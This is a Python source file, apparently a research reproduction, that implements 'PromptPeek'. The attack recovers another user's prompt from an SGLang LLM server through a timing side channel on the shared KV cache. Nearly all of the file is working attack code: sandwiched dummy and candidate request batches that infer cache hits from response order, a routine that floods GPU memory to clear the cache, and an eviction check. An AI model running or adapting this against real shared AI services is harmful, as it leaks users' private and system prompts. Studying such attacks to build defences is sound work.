import asyncio
import logging
from typing import List, Optional, Dict, Tuple
import httpx
from ..candidate.base import get_top_k_candidates, get_bottom_k_dummies
import requests

logger = logging.getLogger(__name__)

SERVER_URL = "http://192.168.1.8:30000"
MAX_PROMPT_LENGTH = 128  # Token limit
CANDIDATES_SIZE = 256  # Number of candidate tokens to consider

DUMMY_TOKEN = "%"
DUMMY_BATCH_SIZE = 32

# 대신 서버를 확실히 잡기 위해 Pre-dummy는 길게 생성합니다.
PRE_DUMMY_MAX_TOKENS = 1
DEFAULT_MAX_TOKENS = 1

# 타이밍은 다시 짧게 가져갑니다. (서버가 일하는 동안 잽싸게 넣기)
PRE_SLEEP_TIME = 0.01
POST_SLEEP_TIME = 0

# 연결 제한 재계산
HTTPX_MAX_CONNECTIONS = int((DUMMY_BATCH_SIZE * 2 + CANDIDATES_SIZE) * 1.5)

# Todo: GPU 메모리 클리어 기능 구현, 논문에서 구현을 다시 검토


async def promptpeek(
    prompt_hint: str, max_prompt_length: int = MAX_PROMPT_LENGTH
) -> str:
    """
    PROMPTPEEK attack simulation function, should be called after Victim is executed.

    Args:
        prompt_hint: Known prefix of the prompt to reconstruct
        max_prompt_length: Maximum number of tokens to reconstruct
        use_dynamic_dummies: If True, use bottom-k tokens as dummies (attack.py style)
                            If False, use fixed '%' token (논문 권장 - 캐시 재사용)
    """
    logger.info(f"Starting attack on {SERVER_URL}...")

    async with httpx.AsyncClient(timeout=600.0) as client:
        await clear_gpu_memory(client)

    # # Wait for victim prompt to be cached
    # await asyncio.sleep(5)
    # requests.post(SGLANG_SERVER + "/flush_cache")
    
    logger.info(f"Starting prompt reconstruction...")
    reconstructed_prompt = prompt_hint

    # prompt = "Imagine you are a business manager who specializes in Organizational Strategy and Crisis Management. You have over 20 years of experience in Silicon Valley, leading diverse teams through rapid scaling and economic downturns."
    # async with httpx.AsyncClient() as client:
    #     response = await _send_sglang_request(client, prompt)
    #     print(f"Prompt: {prompt}\nResponse: {response}\n")
    # await asyncio.sleep(1.0)

    retry_count = 0
    for step in range(max_prompt_length):
        candidates = get_top_k_candidates(reconstructed_prompt, k=CANDIDATES_SIZE)
        matched_token = await promptpeek_one_token(
            candidates, prefix=reconstructed_prompt, dummy_token=DUMMY_TOKEN
        )

        if matched_token is None:
            logger.info("No matched token found. Ending attack.")
            is_prompt_evicted = await check_prompt_evicted(reconstructed_prompt)
            if is_prompt_evicted:
                logger.warning("Prompt has been evicted from cache. Attack failed.")
            else:
                logger.warning("Prompt is still in cache but no token matched")

            if retry_count < 1:
                retry_count += 1
                logger.info(f"Retrying... (Attempt {retry_count}/1)")
                await asyncio.sleep(2.0)
                continue
            break
        else:
            retry_count = 0  # Reset retry count on success

        logger.info(f"Matched Token[{step}]: {matched_token[:10]}")

        reconstructed_prompt += matched_token
        logger.info(f"Reconstructed[{step:<4}]: {reconstructed_prompt}")

    return reconstructed_prompt


async def _send_sglang_request(
    client: httpx.AsyncClient,
    prompt: str,
    server_url: str = SERVER_URL,
    max_tokens: int = 1,
    temperature: float = 0,
) -> Dict:
    """Send a single completion request"""
    # payload = {
    #     "model": "default",
    #     "messages": [{"role": "user", "content": prompt}],
    #     "max_tokens": max_tokens,
    #     "temperature": temperature,
    # }

    payload = {
        "text": prompt,
        "sampling_params": {
            "max_new_tokens": max_tokens,
            "temperature": temperature,
        },
    }
    # response = await client.post(f"{server_url}/v1/chat/completions", json=payload)
    response = await client.post(f"{server_url}/generate", json=payload)
    response.raise_for_status()  # HTTP Error Check
    return response.json()


async def _send_request(
    client: httpx.AsyncClient,
    prompt: str,
    metadata: Dict,
    max_tokens: int = DEFAULT_MAX_TOKENS,
) -> Tuple[Dict, Dict]:
    response = await _send_sglang_request(client, prompt, max_tokens=max_tokens)
    return response, metadata


async def promptpeek_one_token(
    candidates: List[str], prefix: str, dummy_token: str = DUMMY_TOKEN
) -> Optional[str]:
    """
    Send requests in order: [Pre-dummy x 20] → [Candidates x 50] → [Post-dummy x 20]
    Observe response order and return matched token

    Core logic:
    1. Start all requests concurrently using asyncio.create_task()
    2. Track completion order with asyncio.as_completed()
    3. Identify Candidates that complete before Post-dummy

    Args:
        use_dynamic_dummies: If True, use bottom-k tokens as dummies (attack.py style)
                            If False, use fixed dummy_token (논문 권장 - 캐시 재사용)
    """
    # --- Send Requests --- #
    # Generate dummy tokens based on strategy
    dummy_prompt = prefix + dummy_token * 2

    limits = httpx.Limits(
        max_keepalive_connections=None, max_connections=HTTPX_MAX_CONNECTIONS
    )

    async with httpx.AsyncClient(timeout=600.0, limits=limits) as client:
        tasks = []

        # Pre-dummy Requests
        for _ in range(DUMMY_BATCH_SIZE):
            task = asyncio.create_task(
                _send_request(
                    client,
                    dummy_prompt,
                    {"type": "pre_dummy"},
                    max_tokens=PRE_DUMMY_MAX_TOKENS,
                )
            )
            tasks.append(task)

        await asyncio.sleep(
            PRE_SLEEP_TIME
        )  # Small delay to ensure pre-dummies are sent first

        # Candidate Requests
        for candidate_token in candidates:
            task = asyncio.create_task(
                _send_request(
                    client,
                    prefix + candidate_token * 2,
                    {"type": "candidate", "token": candidate_token},
                )
            )
            tasks.append(task)

        await asyncio.sleep(POST_SLEEP_TIME)

        # Post-dummy Requests
        for _ in range(DUMMY_BATCH_SIZE):
            task = asyncio.create_task(
                _send_request(client, dummy_prompt, {"type": "post_dummy"})
            )
            tasks.append(task)

        # --- Check Response Order --- #
        first_post_dummy_arrived = False
        pre_dummy_count = 0
        total_pre_dummies = DUMMY_BATCH_SIZE
        threshold = int(total_pre_dummies * 0.99)
        matched_candidates = []

        for crt in asyncio.as_completed(tasks):
            try:
                result, metadata = await crt
                # print(metadata)
                if metadata["type"] == "pre_dummy":
                    pre_dummy_count += 1
                elif metadata["type"] == "post_dummy":
                    first_post_dummy_arrived = True
                elif metadata["type"] == "candidate":
                    if not first_post_dummy_arrived:
                        matched_candidates.append(metadata["token"])
                        logger.info(f"✓ Match detected: '{metadata['token']}'")
                    else:
                        logger.debug(f"✗ No match: '{metadata['token']}'")
                    # if pre_dummy_count < threshold:
                    #     matched_candidates.append(metadata["token"])
                    #     logger.info(f"✓ Match detected (Jumped Queue): '{metadata['token']}'")
                    # else:
                    #     # Pre-dummy 뒤에 왔다면 매칭 실패로 간주
                    #     pass

            except Exception as e:
                logger.error(f"Request failed: {e}")

        if len(matched_candidates) > 0:
            best_match = matched_candidates[0]
            if len(matched_candidates) > 1:
                logger.warning(
                    f"Multiple jumped candidates: {matched_candidates}, picking first: {best_match}"
                )
            return best_match

        return None


async def clear_gpu_memory(client: httpx.AsyncClient):
    """
    Clear GPU cache by sending DIFFERENT dummy requests with LARGE context.
    논문의 권고대로 Non-identical dummy를 사용하며, 메모리 점유를 위해 길이를 늘립니다.
    """
    logger.info("Clearing GPU memory...")

    # 1. 메모리를 확실히 점유하기 위해 긴 프롬프트와 긴 출력을 사용
    # 예: 각 요청이 약 100 토큰 이상의 KV Cache를 생성하도록 유도
    long_prefix = "This is a dummy text to fill up the GPU memory buffer. " * 10

    tasks = []
    # 요청 수는 GPU 메모리 크기에 따라 조절 필요 (테스트 환경이 작다면 50~100개로 충분할 수 있음)
    for i in range(52):
        unique_prompt = f"{long_prefix} unique_id_{i}_{asyncio.get_event_loop().time()}"

        # max_tokens를 1이 아니라 충분히 크게 설정 (논문: maximum possible [cite: 381])
        # 단, 테스트 속도를 위해 적절히 타협 (예: 64~128)
        task = asyncio.create_task(
            _send_sglang_request(client, unique_prompt, max_tokens=64)
        )
        tasks.append(task)

    # 모든 더미 요청이 완료될 때까지 대기
    await asyncio.gather(*tasks, return_exceptions=True)
    logger.info("GPU memory clear requests sent.")

    # 2. (선택 사항) 확실한 검증을 위해 잠시 대기
    await asyncio.sleep(2.0)


async def check_prompt_evicted(proxy_prompt: str) -> bool:
    """
    프롬프트 제거(Eviction) 감지 로직
    Returns:
        True: 프롬프트가 제거됨 (Evicted) -> 공격 중단 또는 재시작 필요
        False: 프롬프트가 아직 캐시에 있음 (Alive)
    """
    logger.info(f"Checking eviction for proxy: '{proxy_prompt}'")

    # 1. Proxy 프롬프트로 샌드위치 공격 구성
    # 논문에 따르면 Proxy 테스트 시에도 동일한 더미(Identical Dummy)를 사용합니다.
    dummy_prompt = proxy_prompt + DUMMY_TOKEN

    # Proxy 자체를 후보(Candidate)처럼 취급하여 요청 전송
    # 주의: 여기서 proxy_prompt는 이미 완성된 문장입니다.

    tasks = []
    limits = httpx.Limits(
        max_keepalive_connections=None,
        max_connections=HTTPX_MAX_CONNECTIONS,
    )

    async with httpx.AsyncClient(timeout=30.0, limits=limits) as client:
        # (1) Pre-dummy Requests
        for _ in range(DUMMY_BATCH_SIZE):
            tasks.append(
                asyncio.create_task(
                    _send_request(client, dummy_prompt, {"type": "pre_dummy"})
                )
            )

        await asyncio.sleep(0.1)

        # (2) Proxy Request (단 1개)
        # 이것이 Post-dummy보다 빨리 오는지 확인하는 것이 핵심
        tasks.append(
            asyncio.create_task(_send_request(client, proxy_prompt, {"type": "proxy"}))
        )

        await asyncio.sleep(0.05)

        # (3) Post-dummy Requests
        for _ in range(DUMMY_BATCH_SIZE):
            tasks.append(
                asyncio.create_task(
                    _send_request(client, dummy_prompt, {"type": "post_dummy"})
                )
            )

        # --- 응답 순서 관찰 ---
        first_post_dummy_arrived = False
        is_proxy_alive = False

        for crt in asyncio.as_completed(tasks):
            try:
                _, metadata = await crt

                if metadata["type"] == "post_dummy":
                    first_post_dummy_arrived = True

                elif metadata["type"] == "proxy":
                    # Proxy가 Post-dummy보다 먼저 도착했다면? -> 캐시 Hit! (살아있음)
                    if not first_post_dummy_arrived:
                        is_proxy_alive = True
                        logger.debug("Proxy is still in cache (Hit).")
                    else:
                        logger.debug("Proxy arrived late (Miss).")

            except Exception as e:
                logger.error(f"Request failed: {e}")

    # Proxy가 살아있으면(True) -> Evicted는 False
    # Proxy가 죽었으면(False) -> Evicted는 True
    return not is_proxy_alive
